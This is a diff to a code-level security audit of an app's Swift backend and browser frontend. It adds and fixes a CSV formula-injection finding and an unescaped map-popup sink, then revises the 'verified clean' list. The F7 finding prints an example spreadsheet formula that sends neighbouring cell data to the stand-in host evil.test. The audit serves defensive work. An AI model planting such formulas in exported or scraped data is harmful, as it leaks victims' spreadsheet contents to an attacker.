@@ -1,9 +1,14 @@
 # Code-level security audit — 2026-08-30
 
-Scope: the whole repository, 22,778 lines across 186 Swift files plus the report
-subprocess. Earlier audits in this directory assessed production posture and
-rollout; this one reads the code. Every finding below was traced to a concrete
-path, not inferred from a pattern match.
+Scope: the whole repository — 22,778 lines across 186 Swift files, the report
+subprocess, and the browser frontend. Earlier audits in this directory assessed
+production posture and rollout; this one reads the code. Every finding below was
+traced to a concrete path, not inferred from a pattern match.
+
+The first pass covered Swift and Python only and was published as complete. It
+was not: the frontend renders findings — text lifted from third-party pages —
+into the DOM and into a client-generated file, which is where this class of bug
+actually lives. F7 and F8 come from closing that gap.
 
 ## Findings
 
@@ -112,6 +117,46 @@ rather than the day someone remembers to add it to a list. Checked against a
 positive control — an unguarded `/admin/leaky-probe` makes the test fail with
 that exact route named.
 
+### F7 — Medium: formula injection in the client-side CSV export
+
+The backend has no CSV writer, which the first pass correctly established — and
+then wrongly concluded the class did not apply. The **frontend** builds the CSV
+itself (`index.html`, the `export-csv-btn` handler), writing `r.rawData` into
+cells quoted only for embedded double-quotes.
+
+RFC 4180 quoting makes the file parse correctly; it does nothing about formula
+injection. Excel, LibreOffice and Google Sheets evaluate a cell whose value
+begins with `=`, `+`, `-` or `@` — the surrounding quotes are stripped before
+that decision is made.
+
+`rawData` is third-party text by construction: `SiteMetaPlugin` stores a scanned
+page's `<title>`, `DomainPlugin` stores WHOIS output, `PastebinPlugin` stores
+paste excerpts. An attacker who controls a page the victim scans controls a cell
+in the victim's spreadsheet. `=HYPERLINK("https://evil.test?x="&A1,"click")`
+exfiltrates neighbouring data on click, and `=IMPORTXML(...)` fires without any
+interaction in Sheets.
+
+**Fixed.** Cells beginning with a formula-leading character — including the tab
+and carriage-return variants used to bypass naive checks — are prefixed with an
+apostrophe, which marks them literal text in all three applications. Verified
+against six published vectors, with an ordinary finding confirmed to pass
+through unchanged. The download filename now follows the same allowlist
+discipline the server applies to `Content-Disposition`.
+
+### F8 — Low: unescaped interpolation into an HTML sink on the map
+
+`index.html` passed GeoIP fields into Leaflet's `bindPopup`, which takes an HTML
+string, without escaping. Not reachable today: the values come from the offline
+MaxMind database rather than from a scanned page, and the frontend renders only
+lookups with `status === "success"`, which requires `query` to have parsed as an
+address. It was, however, the one place in that file where third-party text met
+an HTML sink unescaped — `createResultCard` sets the opposite standard three
+thousand lines earlier, in a template of empty placeholders filled by
+`textContent`, with a comment saying so.
+
+**Fixed.** The five interpolations are escaped, which also removes any need to
+reason about the hygiene of a vendor data file.
+
 ## Verified clean
 
 Stating only defects would misrepresent the codebase. The following were examined
@@ -140,8 +185,8 @@ and found sound:
   digits, `_` and `-`, so no CR/LF or quote can reach `Content-Disposition`.
 - **SSRF.** `OutboundHTTP.pinnedDestination` gates every plugin request through
   `SSRFGuard.isInternalURL` and pins the validated address, mitigating rebinding.
-- **CSV formula injection.** Not applicable: exports are JSON, Markdown, HTML,
-  PDF and GraphML. No CSV writer exists.
+- **Server-side export formats.** JSON, Markdown, HTML, PDF and GraphML; no CSV
+  writer exists on the server. The client-side CSV export is F7.
 - **Privilege escalation.** No `Content`-decoded struct carries `isAdmin` or any
   role field, so no update endpoint can be coaxed into granting it.
 - **Logging.** No secret, token, scan target or email address is interpolated
@@ -150,3 +195,10 @@ and found sound:
 - **Boot gates.** Production refuses to start without a valid encryption key or
   audit signing key, and bounds notification, export and dark-web configuration
   at startup rather than trusting them at use.
+- **Frontend DOM sinks.** 71 `innerHTML` uses across three non-vendored files,
+  against 177 uses of `textContent`. The result renderer is a static template of
+  empty placeholders filled by `textContent`, deliberately and with a comment.
+  `investigation.js` and `admin.js` escape in both attribute and text contexts,
+  the former noting that entity types can arrive from imported GraphML. No
+  `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval` or `srcdoc`
+  anywhere. The single unescaped sink was F8.
